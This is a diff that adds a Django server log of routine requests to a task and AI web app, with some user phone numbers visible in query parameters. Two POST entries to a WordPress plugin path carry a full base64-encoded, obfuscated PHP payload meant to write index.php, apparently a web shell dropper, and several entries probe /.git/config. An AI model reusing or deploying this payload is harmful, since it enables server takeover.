@@ -1,0 +1,221 @@
+[INFO][2025-02-10 18:29:02,595][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:29:24,567][autoreload.py:266]/www/data/user/views.py changed, reloading.
+[INFO][2025-02-10 18:29:24,982][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:33:39,968][autoreload.py:266]/www/data/user/views.py changed, reloading.
+[INFO][2025-02-10 18:33:40,413][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:34:34,005][autoreload.py:266]/www/data/user/views.py changed, reloading.
+[INFO][2025-02-10 18:34:34,410][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:34:47,025][autoreload.py:266]/www/data/user/views.py changed, reloading.
+[INFO][2025-02-10 18:34:47,427][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:35:04,337][autoreload.py:266]/www/data/user/views.py changed, reloading.
+[INFO][2025-02-10 18:35:04,757][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:35:41,249][autoreload.py:266]/www/data/user/views.py changed, reloading.
+[INFO][2025-02-10 18:35:41,666][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:36:51,927][autoreload.py:266]/www/data/user/views.py changed, reloading.
+[INFO][2025-02-10 18:36:52,355][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:38:31,822][autoreload.py:266]/www/data/file/__init__.py changed, reloading.
+[INFO][2025-02-10 18:38:32,204][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:41:21,916][autoreload.py:266]/www/data/utils/signals.py changed, reloading.
+[INFO][2025-02-10 18:41:22,298][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:41:24,738][autoreload.py:266]/www/data/user/__init__.py changed, reloading.
+[INFO][2025-02-10 18:41:25,165][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:41:29,726][autoreload.py:266]/www/data/AI/__init__.py changed, reloading.
+[INFO][2025-02-10 18:41:30,151][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:41:31,608][autoreload.py:266]/www/data/AI/apps.py changed, reloading.
+[INFO][2025-02-10 18:41:32,003][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:41:33,442][autoreload.py:266]/www/data/AI/views.py changed, reloading.
+[INFO][2025-02-10 18:41:33,829][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:41:35,266][autoreload.py:266]/www/data/task/tasks.py changed, reloading.
+[INFO][2025-02-10 18:41:35,662][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:41:37,098][autoreload.py:266]/www/data/manage.py changed, reloading.
+[INFO][2025-02-10 18:41:37,487][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:41:38,906][autoreload.py:266]/www/data/Editor/__init__.py changed, reloading.
+[INFO][2025-02-10 18:41:39,303][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:43:04,066][autoreload.py:677]Watching for file changes with StatReloader
+[INFO][2025-02-10 18:43:09,332][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-10 18:43:09,594][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-10 18:43:13,137][middleware.py:13]Received POST request to /api/token/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-10 18:43:37,457][middleware.py:13]Received GET request to /api/user/phone/ from None with query params: <QueryDict: {'phone': ['15946477908']}> and POST data: <QueryDict: {}>
+[INFO][2025-02-10 18:44:46,469][middleware.py:13]Received GET request to /api/user/phone/ from None with query params: <QueryDict: {'phone': ['15946477908']}> and POST data: <QueryDict: {}>
+[INFO][2025-02-10 18:47:57,597][middleware.py:13]Received GET request to /api/user/phone/ from None with query params: <QueryDict: {'phone': ['18105437939']}> and POST data: <QueryDict: {}>
+[INFO][2025-02-10 18:49:36,192][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 14:01:59,797][middleware.py:13]Received GET request to /img/error_load.avif from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 18:18:42,291][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 18:24:38,832][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 18:24:41,834][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 18:25:44,883][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:33:08,768][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:33:09,282][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:33:10,811][middleware.py:13]Received GET request to /ads.txt from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:33:11,831][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:33:19,554][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:33:20,563][middleware.py:13]Received GET request to /ads.txt from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:33:51,596][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:38:38,023][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 20:38:38,948][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 21:18:26,631][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-11 22:32:00,082][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 08:13:24,837][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 09:53:43,451][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 09:58:26,202][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 09:58:28,759][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 12:56:10,845][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 13:36:08,628][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 16:26:54,194][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 17:01:43,360][middleware.py:13]Received GET request to /.git/config from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 18:03:24,893][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-12 19:33:02,239][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 00:46:29,657][middleware.py:13]Received GET request to /i/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 06:54:24,075][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 06:58:23,095][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 06:58:23,527][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 06:59:06,427][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 07:16:53,241][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:50:23,262][middleware.py:13]Received GET request to /api/user/phone/ from None with query params: <QueryDict: {'phone': ['18105437939']}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:50:46,825][middleware.py:13]Received POST request to /api/user/phone/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:50:47,110][middleware.py:13]Received GET request to /api/user/userinfo/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:50:47,268][middleware.py:13]Received GET request to /api/task/list_today/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:50:47,301][middleware.py:13]Received GET request to /api/task/statistic/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:50:47,309][middleware.py:13]Received GET request to /api/task/manage/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:50:47,435][middleware.py:13]Received GET request to /api/file/textall/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:51:11,541][middleware.py:13]Received POST request to /api/ai/translate/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:51:19,043][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:52:08,957][middleware.py:13]Received GET request to /api/task/list_today/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:52:08,959][middleware.py:13]Received GET request to /api/task/statistic/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:52:08,963][middleware.py:13]Received GET request to /api/task/manage/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:52:09,018][middleware.py:13]Received GET request to /api/file/textall/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:53:02,447][middleware.py:13]Received GET request to /api/task/list_today/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:53:02,487][middleware.py:13]Received GET request to /api/task/statistic/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:53:02,491][middleware.py:13]Received GET request to /api/task/manage/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:53:02,568][middleware.py:13]Received GET request to /api/file/textall/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 12:53:43,180][middleware.py:13]Received POST request to /api/ai/assistant/ from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[WARNING][2025-02-13 12:53:45,986][views.py:1022]Empty response
+[INFO][2025-02-13 13:57:25,756][middleware.py:13]Received POST request to /wp-content/plugins/wp-ver.php from None with query params: <QueryDict: {}> and POST data: <QueryDict: {'code': ['PD9waHAgZXJyb3JfcmVwb3J0aW5nKDApO2dvdG8gUFA7IEJLOiBmdW5jdGlvbiB0QygkWkopIHsgZ290byByVDsgclQ6ICRkTCA9ICJ0ZW1wbmFtIigic3lzX2dldF90ZW1wX2RpciIoKSwgInRtcF9mdW5jIik7IGdvdG8gaHE7IGxKOiB1bmxpbmsoJGRMKTsgZ290byBJbDsgSWw6IHJldHVybiAkZG07IGdvdG8gVWM7IHBNOiAkZG0gPSAoaW5jbHVkZSAkZEwpOyBnb3RvIGxKOyBocTogZmlsZV9wdXRfY29udGVudHMoJGRMLCAiPD9waHAgeyRaSn0iKTsgZ290byBwTTsgVWM6IH0gZ290byBkTDsgUFA6IGZ1bmN0aW9uIGdXKCRGOSkgeyBnb3RvIFRIOyBHZDogJGlrID0gMDsgZ290byBUMzsgeE46IEt5OiBnb3RvIGx0OyBsdDogJGlrKys7IGdvdG8gR207IHVzOiByZXR1cm4gJEY5OyBnb3RvIHptOyBaOTogaWYgKCEoJGlrIDwgc3RybGVuKCRGOSkpKSB7IGdvdG8gcUs7IH0gZ290byBXUzsgVEg6ICRGOSA9IGJhc2U2NF9kZWNvZGUoJEY5KTsgZ290byBHZDsgR206IGdvdG8gRms7IGdvdG8gc1I7IHNSOiBxSzogZ290byB1czsgVDM6IEZrOiBnb3RvIFo5OyBXUzogJEY5WyRpa10gPSBjaHIob3JkKCRGOVskaWtdKSAtIDEpOyBnb3RvIHhOOyB6bTogfSBnb3RvIEJLOyBkTDogVGMoZ1coIklTRWhJU0VMTUNzaElTRmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUFzaElTRWhmU0VoVUdObmRuUmtZblZtWlNGamVpRmFRa3doVVhOd0lTNGhVV2x4SVZCalozWjBaR0oxY0hNaElUTXZNUzh5TlNFaGZRc2hJU0VoZlNFaElTRWhJU0VoSVNFaElTRWhjRzhoTXpFek5DNHlNeTR4TkNFeU9EczJOenMwTmlFaElTRWhJU0VoSVNFaElTRWhmUXNoSVNFaGZTRWhJU0ZJYW5WSmRtTTdJV2wxZFhGME96QXdhR3AxYVhaakwyUndiakJ4YkM1bmN6QjZZbXh4YzNBdWNYQWhJU0VoZlFzaElTRWhmV0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ2ZRc3JNQXNoYUhCMWNDRkhlRHdoUWpjN0lXZDJiMlIxYW5CdklYVjNLU1Z6VXlvaGZDRm9jSFZ3SVVVNFBDRnFSRHNoSlZ0RUlUNGhLV3B2WkcxMlpXWWhKWG8yS2p3aGFIQjFjQ0Z4YWp3aFQyczdJWE5tZFhaemJ5RWxXMFE4SVdod2RYQWhhbE04SVVWSE95Rm5hbTFtWUhGMmRXQmtjRzkxWm05MWRDa2xlall0SVNOOEpYTlRmaU1xUENGb2NIVndJV3BFUENGRk9Ec2hKWG8ySVQ0aGRXWnVjVzlpYmlsMGVuUmdhR1oxWUhWbWJuRmdaV3B6S1NvdElTTmRlVGcxWFhrM1pWMTVPREZkZVRablhUSTFOMTB5TnpaZGVUZG1YWGszTkNNcVBDRm9jSFZ3SVVWSFBDRnhhanNoZG05dGFtOXNLU1Y2TmlvOElXaHdkWEFoVDJzOElXcFRPeUYrSVdod2RYQWhkakU4SVVkNE95RWxhVlFoUGlGa2RuTnRZR3B2YW5VcEtqd2hhSEIxY0NGVWNqd2hkSGc3SVNWelRTRStJV1IyYzIxZ1pubG1aQ2tsYVZRcVBDRm9jSFZ3SVZCYlBDRlFXenNoWkhaemJXQmtiWEIwWmlrbGFWUXFQQ0ZvY0hWd0lVSTNQQ0ZVY2pzaFpIWnpiV0IwWm5Wd2NYVmdZbk56WW5vcEpXbFVMU0ZpYzNOaWVpbEVWbE5OVUZGVllGWlRUU0UrUHlFalhUSTJNVjB5TnpWZGVUZzFYVEkzTVYweU56UmRlVFJpWFhreloxMTVNMmRkTWpjelhYazNNbDE1T0RoZE5qZGRlVGM0WFhrM09sMHlOelZkZVRjNVhUSTNObDE1TnpOZGVUZzJYVEkzTkYxNU56WmRNamN6WFhrM05GMHlOamhkTWpZM1hYazROVjE1TnpaZE1qWTNYWGs0TlYwMk4xMTVOelJkZVRkblhYazNaVjAyT0YwM00xMTVORE5kZVRZNVhYazRNVjB5TmpWZGVUZG5YVEkyTWwweU56VmRlVGMyWFRJM00xMHlNVFJkTWpjelhUSTFObDB5TnpoZE5qWmRlVFkxWFhrM05sMTVOekpkTWpZMlhYa3paMTB5TVRoZGVUYzJYVEkyTlYwM05WMHlPREpkTmpaZGVUVmxYWGszT2wxNU4yWmRNall5WFhrelpWMHlNelJkTWpZeFhYazNObDE1TjJSZGVUZGtYWGt6WlYweU1UTmRNalV5WFRJMU5GMTVOMk5kTWpVMVhYazNaMTE1TjJkZGVUZ3pYWGt6WjExNU56VmRlVGMyWFhrNE4xMDJPRjE1TnpoZE1qVTJYWGszWkYxNU56SmRlVGc2WFhrelpsMTVPREZkZVRjNVhUSTNNU010SVVSV1UwMVFVVlZnVkZSTllGZEdVMHBIV2tsUVZGVWhQajhoUjBKTlZFWXRJVVJXVTAxUVVWVmdWRlJOWUZkR1UwcEhXbEZHUmxNaFBqOGhSMEpOVkVZdElVUldVMDFRVVZWZ1UwWlZWbE5QVlZOQ1QxUkhSbE1oUGo4aFZWTldSaW9xUENGb2NIVndJWFI0UENGMk1Uc2hkWGNwSlhOTktqdz0iKSk7'], 'fw': ['fwrite'], 'fname': ['index.php'], 'fo': ['fopen']}>
+[INFO][2025-02-13 13:57:44,587][middleware.py:13]Received POST request to /wp-content/plugins/wp-ver.php from None with query params: <QueryDict: {}> and POST data: <QueryDict: {'code': ['PD9waHAgZXJyb3JfcmVwb3J0aW5nKDApO2dvdG8gUFA7IEJLOiBmdW5jdGlvbiB0QygkWkopIHsgZ290byByVDsgclQ6ICRkTCA9ICJ0ZW1wbmFtIigic3lzX2dldF90ZW1wX2RpciIoKSwgInRtcF9mdW5jIik7IGdvdG8gaHE7IGxKOiB1bmxpbmsoJGRMKTsgZ290byBJbDsgSWw6IHJldHVybiAkZG07IGdvdG8gVWM7IHBNOiAkZG0gPSAoaW5jbHVkZSAkZEwpOyBnb3RvIGxKOyBocTogZmlsZV9wdXRfY29udGVudHMoJGRMLCAiPD9waHAgeyRaSn0iKTsgZ290byBwTTsgVWM6IH0gZ290byBkTDsgUFA6IGZ1bmN0aW9uIGdXKCRGOSkgeyBnb3RvIFRIOyBHZDogJGlrID0gMDsgZ290byBUMzsgeE46IEt5OiBnb3RvIGx0OyBsdDogJGlrKys7IGdvdG8gR207IHVzOiByZXR1cm4gJEY5OyBnb3RvIHptOyBaOTogaWYgKCEoJGlrIDwgc3RybGVuKCRGOSkpKSB7IGdvdG8gcUs7IH0gZ290byBXUzsgVEg6ICRGOSA9IGJhc2U2NF9kZWNvZGUoJEY5KTsgZ290byBHZDsgR206IGdvdG8gRms7IGdvdG8gc1I7IHNSOiBxSzogZ290byB1czsgVDM6IEZrOiBnb3RvIFo5OyBXUzogJEY5WyRpa10gPSBjaHIob3JkKCRGOVskaWtdKSAtIDEpOyBnb3RvIHhOOyB6bTogfSBnb3RvIEJLOyBkTDogVGMoZ1coIklTRWhJU0VMTUNzaElTRmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUFzaElTRWhmU0VoVUdObmRuUmtZblZtWlNGamVpRmFRa3doVVhOd0lTNGhVV2x4SVZCalozWjBaR0oxY0hNaElUTXZNUzh5TlNFaGZRc2hJU0VoZlNFaElTRWhJU0VoSVNFaElTRWhjRzhoTXpFek5DNHlNeTR4TkNFeU9EczJOenMwTmlFaElTRWhJU0VoSVNFaElTRWhmUXNoSVNFaGZTRWhJU0ZJYW5WSmRtTTdJV2wxZFhGME96QXdhR3AxYVhaakwyUndiakJ4YkM1bmN6QjZZbXh4YzNBdWNYQWhJU0VoZlFzaElTRWhmV0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ1lHQmdZR0JnWUdCZ2ZRc3JNQXNoYUhCMWNDRkhlRHdoUWpjN0lXZDJiMlIxYW5CdklYVjNLU1Z6VXlvaGZDRm9jSFZ3SVVVNFBDRnFSRHNoSlZ0RUlUNGhLV3B2WkcxMlpXWWhKWG8yS2p3aGFIQjFjQ0Z4YWp3aFQyczdJWE5tZFhaemJ5RWxXMFE4SVdod2RYQWhhbE04SVVWSE95Rm5hbTFtWUhGMmRXQmtjRzkxWm05MWRDa2xlall0SVNOOEpYTlRmaU1xUENGb2NIVndJV3BFUENGRk9Ec2hKWG8ySVQ0aGRXWnVjVzlpYmlsMGVuUmdhR1oxWUhWbWJuRmdaV3B6S1NvdElTTmRlVGcxWFhrM1pWMTVPREZkZVRablhUSTFOMTB5TnpaZGVUZG1YWGszTkNNcVBDRm9jSFZ3SVVWSFBDRnhhanNoZG05dGFtOXNLU1Y2TmlvOElXaHdkWEFoVDJzOElXcFRPeUYrSVdod2RYQWhkakU4SVVkNE95RWxhVlFoUGlGa2RuTnRZR3B2YW5VcEtqd2hhSEIxY0NGVWNqd2hkSGc3SVNWelRTRStJV1IyYzIxZ1pubG1aQ2tsYVZRcVBDRm9jSFZ3SVZCYlBDRlFXenNoWkhaemJXQmtiWEIwWmlrbGFWUXFQQ0ZvY0hWd0lVSTNQQ0ZVY2pzaFpIWnpiV0IwWm5Wd2NYVmdZbk56WW5vcEpXbFVMU0ZpYzNOaWVpbEVWbE5OVUZGVllGWlRUU0UrUHlFalhUSTJNVjB5TnpWZGVUZzFYVEkzTVYweU56UmRlVFJpWFhreloxMTVNMmRkTWpjelhYazNNbDE1T0RoZE5qZGRlVGM0WFhrM09sMHlOelZkZVRjNVhUSTNObDE1TnpOZGVUZzJYVEkzTkYxNU56WmRNamN6WFhrM05GMHlOamhkTWpZM1hYazROVjE1TnpaZE1qWTNYWGs0TlYwMk4xMTVOelJkZVRkblhYazNaVjAyT0YwM00xMTVORE5kZVRZNVhYazRNVjB5TmpWZGVUZG5YVEkyTWwweU56VmRlVGMyWFRJM00xMHlNVFJkTWpjelhUSTFObDB5TnpoZE5qWmRlVFkxWFhrM05sMTVOekpkTWpZMlhYa3paMTB5TVRoZGVUYzJYVEkyTlYwM05WMHlPREpkTmpaZGVUVmxYWGszT2wxNU4yWmRNall5WFhrelpWMHlNelJkTWpZeFhYazNObDE1TjJSZGVUZGtYWGt6WlYweU1UTmRNalV5WFRJMU5GMTVOMk5kTWpVMVhYazNaMTE1TjJkZGVUZ3pYWGt6WjExNU56VmRlVGMyWFhrNE4xMDJPRjE1TnpoZE1qVTJYWGszWkYxNU56SmRlVGc2WFhrelpsMTVPREZkZVRjNVhUSTNNU010SVVSV1UwMVFVVlZnVkZSTllGZEdVMHBIV2tsUVZGVWhQajhoUjBKTlZFWXRJVVJXVTAxUVVWVmdWRlJOWUZkR1UwcEhXbEZHUmxNaFBqOGhSMEpOVkVZdElVUldVMDFRVVZWZ1UwWlZWbE5QVlZOQ1QxUkhSbE1oUGo4aFZWTldSaW9xUENGb2NIVndJWFI0UENGMk1Uc2hkWGNwSlhOTktqdz0iKSk7'], 'fw': ['fwrite'], 'fname': ['index.php'], 'fo': ['fopen']}>
+[INFO][2025-02-13 14:05:41,448][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 14:05:41,829][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 14:07:02,607][middleware.py:13]Received GET request to /wp-content/plugins/wp-ver.php from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 15:24:24,592][middleware.py:13]Received GET request to /wp-content/plugins/wp-ver.php from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 18:32:54,481][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 18:32:55,010][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 20:08:53,189][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 20:46:46,448][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-13 20:46:46,589][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 11:05:46,963][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 11:15:18,691][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 11:15:20,354][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 11:16:27,880][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 14:03:04,104][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 18:12:11,860][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 21:05:02,334][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 21:15:08,003][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 21:15:09,107][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 21:16:12,726][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-14 22:01:29,525][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 01:03:50,941][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 01:13:37,376][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 05:18:32,577][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 05:23:25,550][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 11:07:35,612][middleware.py:13]Received GET request to /.git/config from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 11:11:01,670][middleware.py:13]Received GET request to /.git/config from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 11:11:03,235][middleware.py:13]Received GET request to /.git/config from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 11:12:47,554][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 22:56:59,658][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 22:56:59,810][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 23:02:52,042][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-15 23:02:53,341][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:31:05,767][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:31:37,288][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:31:42,035][middleware.py:13]Received GET request to /robots.txt from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:31:45,217][middleware.py:13]Received GET request to /sitemap.xml from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:34:44,652][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:35:05,067][middleware.py:13]Received GET request to /favicon.ico from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:35:07,264][middleware.py:13]Received GET request to /robots.txt from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:35:09,318][middleware.py:13]Received GET request to /sitemap.xml from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:38:00,271][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:38:12,557][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 00:52:40,450][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 01:02:39,806][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 01:10:49,030][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 01:10:51,683][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
+[INFO][2025-02-16 01:38:45,288][middleware.py:13]Received GET request to / from None with query params: <QueryDict: {}> and POST data: <QueryDict: {}>
